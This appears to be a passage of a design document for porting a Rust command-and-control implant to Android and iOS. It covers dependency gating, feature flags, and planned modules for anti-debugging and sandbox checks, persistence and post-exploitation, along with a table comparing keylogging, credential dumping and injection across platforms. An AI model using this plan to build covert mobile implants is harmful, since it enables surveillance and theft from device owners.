|------------|---------|-----|-------|
| log | ✅ | ✅ | Pure Rust |
| serde | ✅ | ✅ | Pure Rust |
| thiserror | ✅ | ✅ | Pure Rust |
| aes-gcm | ✅ | ✅ | Pure Rust |
| sha2 | ✅ | ✅ | Pure Rust |
| rand | ✅ | ✅ | Pure Rust |
| anyhow | ✅ | ✅ | Pure Rust |
| async-trait | ✅ | ✅ | Proc-macro |
| x25519-dalek | ✅ | ✅ | Pure Rust |
| ed25519-dalek | ✅ | ✅ | Pure Rust |
| hkdf | ✅ | ✅ | Pure Rust |
| getrandom | ✅ | ✅ | Android/iOS backends supported |
| chacha20poly1305 | ✅ | ✅ | Pure Rust |
| zeroize | ✅ | ✅ | Pure Rust |
| hmac | ✅ | ✅ | Pure Rust |
| once_cell | ✅ | ✅ | Pure Rust |
| serde_json | ✅ | ✅ | Pure Rust |
| base64 | ✅ | ✅ | Pure Rust |
| toml | ✅ | ✅ | Pure Rust |
| urlencoding | ✅ | ✅ | Pure Rust |

**Common crate verdict:** Fully compatible with both Android and iOS. All dependencies are pure Rust or have well-established mobile target support. No build.rs blockers.

### 3.3 Dependency Blockers Summary

| Blocker | Severity | Resolution |
|---------|----------|------------|
| `windows-sys` features exposed even on non-Windows | Low | Already compiles (empty stubs). No action needed. |
| `enigo` on Linux target_os matches Android | **High** | Must add `#[cfg(not(target_os = "android"))]` to enigo dependency or gate behind `remote-assist` + not(android) |
| `x11rb` on Linux target_os matches Android | **High** | Must gate: `all(target_os = "linux", not(target_os = "android"))` |
| `zbus` on Linux target_os matches Android | Medium | Gate behind `not(target_os = "android")` |
| `portable-pty` uses fork() | **High** (iOS) | Gate interactive_shell behind `not(target_os = "ios")` for iOS; works on Android |
| `sysinfo` native code | Medium | Already has fallback paths; may need Android-specific updates |
| `pe_resolve` PEB walking | Low | PEB-only on Windows; ELF fallback on Linux. No-op on non-Windows is acceptable |
| `security-framework` (needed for iOS TLS) | Low | Already pulled transitively by rustls-native-certs |

---

## 4. Proposed Feature Flag Schema

### 4.1 New Mobile Feature Flags

```toml
[features]
# ── Mobile platform support ──────────────────────────────────────────

# Android platform support. Enables JNI bridge, Android env checks,
# Android persistence, and Android post-exploitation modules.
# Implies `mobile-common` for shared mobile infrastructure.
mobile-android = []

# iOS platform support. Enables C bridge, iOS env checks,
# iOS persistence, and iOS post-exploitation modules.
# Implies `mobile-common` for shared mobile infrastructure.
mobile-ios = []

# Shared mobile platform infrastructure (JNI helpers, ObjC helpers,
# mobile-specific transport adaptations). Automatically enabled by
# mobile-android or mobile-ios.
mobile-common = []
```

### 4.2 Revised Platform-Conditional Dependency Gating

```toml
# ── Linux dependencies ── (EXCLUDE Android from X11/DBus deps)
[target.'cfg(all(target_os = "linux", not(target_os = "android")))'.dependencies]
enigo = { version = "0.2", optional = true, default-features = false, features = ["x11rb"] }
image = { version = "0.25", optional = true, default-features = false, features = ["png"] }
x11rb = { version = "0.13", optional = true, features = ["image"] }
zbus = { version = "4", optional = true, default-features = false, features = ["tokio"] }
futures-util = { version = "0.3", optional = true, default-features = false }

# ── Android-specific dependencies ──
[target.'cfg(target_os = "android")'.dependencies]
jni = { version = "0.21", features = ["invocation"] }
android_logger = "0.14"
log = "0.4"  # already present, but explicitly needed for android_logger init

# ── iOS-specific dependencies ──
[target.'cfg(target_os = "ios")'.dependencies]
objc = "0.2"
objc-foundation = "0.1"
objc_id = "0.1"
block = "0.1"
# security-framework is already transitively available via rustls-native-certs
```

### 4.3 Feature Flag Interactions

```
Feature ladder:
  default → mobile-android → mobile-common
  default → mobile-ios → mobile-common

Mutual exclusion rules (handled by cfg):
  - mobile-android AND mobile-ios can both be enabled (builds both platform adapters)
  - actual target_os cfg selects which code compiles
  - Feature flags control module inclusion; cfg(target_os) controls implementation selection

Stealth features incompatible with mobile:
  - direct-syscalls (Windows NT only) — silently no-op on mobile
  - stack-spoof (Windows x86_64) — silently no-op on mobile
  - all injection features — Windows-only, gated
  - kernel-callback (BYOVD) — Windows-only, gated
  - evanesco (VEH-based) — Windows-only, gated
  - cet-bypass, cfg-bypass, coop — Windows-only, gated
```

### 4.4 Crate Type Switching

```toml
# Produce shared library (.so) for Android (JNI loading)
[lib]
crate-type = [
    "lib",       # standard Rust lib (always)
    "cdylib",    # dynamic lib for Android (JNI loads .so)
]

# When targeting iOS, override to produce static lib
# (handled via .cargo/config.toml or build.rs detection)
# iOS: crate-type = ["staticlib", "lib"]
```

---

## 5. Module Porting Priority

### Priority 1: Build System (Foundation)
1. `Cargo.toml` — feature flag additions, dependency gating
2. `agent/build.rs` — Android target handling
3. `.cargo/config.toml` — Android NDK linker configuration
4. `common/Cargo.toml` — verify all deps compile

### Priority 2: Core Agent Compilation (No Mobile Features)
1. `agent/src/lib.rs` — add `#[cfg(target_os = "android")]` module stubs
2. `agent/src/android/mod.rs` — stub module declarations
3. `agent/src/ios/mod.rs` — stub module declarations
4. Get `cargo check --target aarch64-linux-android -p agent --no-default-features` passing

### Priority 3: JNI Bridge (Android) / C Bridge (iOS)
1. `agent/src/android/jni_bridge.rs` — JNI entry points
2. `agent/src/ios/bridge.rs` — C ABI entry points
3. Android project scaffolding (`mobile/android/`)
4. iOS project scaffolding (`mobile/ios/`)

### Priority 4: Environment Checks
1. `agent/src/android/env_checks.rs` — debugger, root, emulator, sandbox
2. `agent/src/ios/env_checks.rs` — jailbreak, debugger, simulator
3. `agent/src/android/jni_helpers.rs` — JNI wrappers for Android APIs
4. `agent/src/ios/objc_helpers.rs` — ObjC wrappers for iOS APIs

### Priority 5: Persistence
1. `agent/src/android/persistence.rs`
2. `agent/src/ios/persistence.rs`

### Priority 6: Post-Exploitation
1. `agent/src/android/post_exploitation.rs`
2. `agent/src/ios/post_exploitation.rs`

### Priority 7: C2 Transport Adaptation
1. Transport retry/reconnection logic for mobile
2. Battery-aware scheduling

### Priority 8: Builder Pipeline
1. `builder/src/mobile.rs`
2. Server API extensions

### Priority 9: Testing & Documentation
1. Test infrastructure
2. Documentation updates

---

## 6. Risk Areas

### 6.1 Operations Fundamentally Different or Impossible on Mobile

| Operation | Windows/Linux | Android | iOS | Risk Level |
|-----------|--------------|---------|-----|------------|
| Process injection | Extensive (NtCreateThreadEx, NtMapViewOfSection, etc.) | Very limited (ptrace, /proc/self/mem — requires root) | Impossible in sandbox, limited even jailbroken | **CRITICAL** |
| DLL/so reflective loading | Full PE/ELF loading | Possible via `dlopen` from memory (requires `memfd_create` or `/proc/self/fd`) | Impossible (no dlopen from memory, code signing enforcement) | **CRITICAL** |
| Direct syscalls | NT syscall stubs via indirect syscall | n/a (Linux syscalls available) | n/a (XNU syscalls blocked by sandbox) | **HIGH** |
| Memory forensics evasion | PEB scrubbing, handle table cleanup, thread hiding | `/proc/self/` scrubbing limited, no PEB | No `/proc`, no process introspection | **HIGH** |
| Cross-process memory access | ReadProcessMemory, WriteProcessMemory | `/proc/<pid>/mem` (requires root or same UID) | `mach_vm_read` (requires `task_for_pid`, restricted) | **HIGH** |
| Persistence across reboot | systemd, schtasks, LaunchDaemons, WMI | Foreground Service, WorkManager, BOOT_COMPLETED | Limited: background fetch, silent push, significant-location | **MEDIUM** |
| Keylogging | WH_KEYBOARD_LL, CGEventTap, evdev | AccessibilityService (user permission required) | Custom keyboard extension only | **MEDIUM** |
| Screenshot of other apps | GDI, X11 SHM, CGWindowListCreateImage | MediaProjection (user permission), root: fb0 | UIGraphicsImageRenderer (own app only), jailbroken: IOSurface | **MEDIUM** |
| Credential dumping | LSASS, DPAPI, Keychain, /etc/shadow | Android Keystore, Chrome SQLite (root), WiFi config files | Keychain (own items only unless jailbroken) | **MEDIUM** |
| Command execution (shell) | cmd.exe, /bin/sh, PowerShell | `/system/bin/sh` (limited, may not exist on some devices) | No shell access in sandbox | **LOW** |
| ARP/network scanning | Raw sockets, /proc/net/arp | `/proc/net/arp` (limited), requires root for raw sockets | No raw sockets | **MEDIUM** |
| fork() | Available on all desktop OSes | Available (bionic libc) | **FORBIDDEN** in sandboxed apps — app will be killed | **CRITICAL** |
| Thread creation | Unrestricted | Unrestricted (within process) | Unrestricted (within process) | **LOW** |
| File system access | Full access (permissions permitting) | Scoped to app data directory + external storage (permissions) | Scoped to app container only | **MEDIUM** |
| Network connections | Full access | Full access (INTERNET permission) | Full access (App Transport Security may restrict HTTP) | **LOW** |

### 6.2 Architectural Risks

1. **JNI boundary panics are UB**: All JNI-facing functions MUST use `std::panic::catch_unwind`. A panic that unwinds through JNI frames is undefined behavior and will corrupt the JVM.

2. **Android lifecycle kills the process**: Android may kill the agent process at any time to reclaim memory. All state must be periodically persisted. The agent cannot rely on long-running uninterrupted execution.

3. **iOS app review risk**: Background modes (VoIP, audio, location) that keep the agent alive will trigger Apple app review scrutiny. The app must have a legitimate reason for each background mode declared.

4. **Code signing on iOS**: All executable code must be signed by Apple. JIT compilation (`mmap` + `mprotect` to RWX) is blocked on iOS 14.4+ without the `com.apple.security.cs.allow-jit` entitlement, which is only available in specific circumstances.

5. **Android SELinux**: On production (user) builds, SELinux is enforcing. Many `/proc` files and syscalls that work on desktop Linux are blocked. Root is required to bypass SELinux.

6. **No `fork()` on iOS**: Any code path that calls `fork()` (including `portable-pty`, `std::process::Command`, and some Tokio internals) must be feature-gated on iOS. The app will be killed by the system.

7. **Battery and thermal constraints**: Mobile devices throttle CPU aggressively. Long-running crypto operations, network scanning, or busy loops will trigger thermal throttling and may cause the app to be killed.

8. **Network transitions**: WiFi ↔ cellular handoffs change the device IP address and break TCP connections. All transports must handle connection loss and reconnection with DNS re-resolution.

### 6.3 Platform-Specific API Limitations

**Android:**
- `ActivityManager.getRunningAppProcesses()` deprecated in API 21, returns only own process in API 28+
- `WifiManager.startScan()` requires `ACCESS_FINE_LOCATION` permission on Android 8+
- `android.os.Build.SERIAL` deprecated in API 26, requires `READ_PHONE_STATE` permission
- `/proc/net/tcp` requires root on some Android versions
- `syscall()` function is not available through Bionic libc (no `SYS_` constants in NDK)

**iOS:**
- `sysctl` with `KERN_PROC` provides minimal process info — no command line, no environment
- `mach_vm_protect` fails for other processes without `task_for_pid` entitlement (Apple-only)
- `NSProcessInfo` `processInfo.environment` is available but limited
- No `dlopen` / `dlsym` from memory — all code must be loaded from signed disk files
- `UIApplication.sharedApplication` can only be called from the main thread

---

## Appendices

### A. Existing Code Patterns for Platform Gating

**Pattern 1: Module-level cfg in lib.rs**
```rust
#[cfg(windows)]
pub mod lateral_movement;
```

**Pattern 2: Function-level cfg with fallback**
```rust
pub fn is_debugger_present() -> bool {
    #[cfg(windows)] { windows_is_debugger_present() }
    #[cfg(target_os = "linux")] { linux_is_debugger_present() }
    #[cfg(target_os = "macos")] { macos_is_debugger_present() }
    #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))] { false }
}
```

**Pattern 3: Inline cfg on variable bindings**
```rust
#[cfg(target_os = "linux")]
let yama = read_yama_ptrace_scope();
#[cfg(not(target_os = "linux"))]
let yama = None;
```

### B. Android NDK Setup Prerequisites

```bash
# Install Android targets
rustup target add aarch64-linux-android x86_64-linux-android

# Install Android NDK (via Android Studio or command line)
# Set NDK paths in .cargo/config.toml:
# [target.aarch64-linux-android]
# linker = "/path/to/ndk/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android26-clang"
```

### C. iOS Build Prerequisites

```bash
# Install iOS targets
rustup target add aarch64-apple-ios x86_64-apple-ios

# Build with cargo-lipo for universal libraries
cargo install cargo-lipo

# Or link directly with Xcode:
# [target.aarch64-apple-ios]
# linker = "clang"  # Xcode's clang handles all frameworks